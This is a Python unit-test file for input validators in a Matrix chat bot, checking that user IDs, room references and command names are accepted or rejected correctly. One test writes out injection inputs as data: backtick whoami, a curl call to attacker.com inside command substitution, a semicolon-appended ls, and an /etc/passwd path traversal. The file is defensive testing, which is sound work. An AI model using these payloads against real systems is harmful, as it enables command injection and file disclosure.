from __future__ import annotations

import unittest

from spacebot.validation import (
    validate_args,
    validate_command_name,
    validate_message_payload,
    validate_room_ref,
    validate_user_id,
)


class ValidationTests(unittest.TestCase):
    def test_valid_baseline_inputs(self) -> None:
        self.assertEqual(validate_message_payload("help"), (True, None))
        self.assertEqual(validate_command_name("autoinvite"), (True, None))
        self.assertEqual(validate_user_id("@alice:example.com"), (True, None))
        self.assertEqual(
            validate_room_ref("!space123:example.com"), (True, None)
        )
        self.assertEqual(
            validate_room_ref("#general:example.com"), (True, None)
        )

    def test_reject_null_byte_and_hidden_chars(self) -> None:
        ok, _ = validate_message_payload("help\x00")
        self.assertFalse(ok)
        ok, _ = validate_message_payload("help\u200b")
        self.assertFalse(ok)
        ok, _ = validate_args(["@user\u200b:example.com"])
        self.assertFalse(ok)

    def test_reject_command_confusables_and_whitespace_variants(self) -> None:
        ok, _ = validate_command_name("һelp")
        self.assertFalse(ok)
        ok, _ = validate_command_name("help!")
        self.assertFalse(ok)
        ok, _ = validate_command_name("")
        self.assertFalse(ok)

    def test_reject_malformed_matrix_ids(self) -> None:
        self.assertFalse(validate_user_id("user:example.com")[0])
        self.assertFalse(validate_user_id("@@user:example.com")[0])
        self.assertFalse(validate_user_id("@user")[0])
        self.assertFalse(validate_user_id("@")[0])

        self.assertFalse(validate_room_ref("space:example.com")[0])
        self.assertFalse(validate_room_ref("!!space:example.com")[0])
        self.assertFalse(validate_room_ref("! !")[0])

    def test_reject_injection_payload_shapes(self) -> None:
        self.assertFalse(
            validate_user_id("@user:example.com`whoami`")[0]
        )
        self.assertFalse(
            validate_user_id("@user$(curl http://attacker.com):example.com")[0]
        )
        self.assertFalse(
            validate_room_ref("!space:example.com;ls -la")[0]
        )
        self.assertFalse(
            validate_room_ref("../../../etc/passwd")[0]
        )

    def test_reject_oversized_args(self) -> None:
        very_long_arg = "A" * 300
        ok, _ = validate_args([very_long_arg])
        self.assertFalse(ok)


if __name__ == "__main__":
    unittest.main()
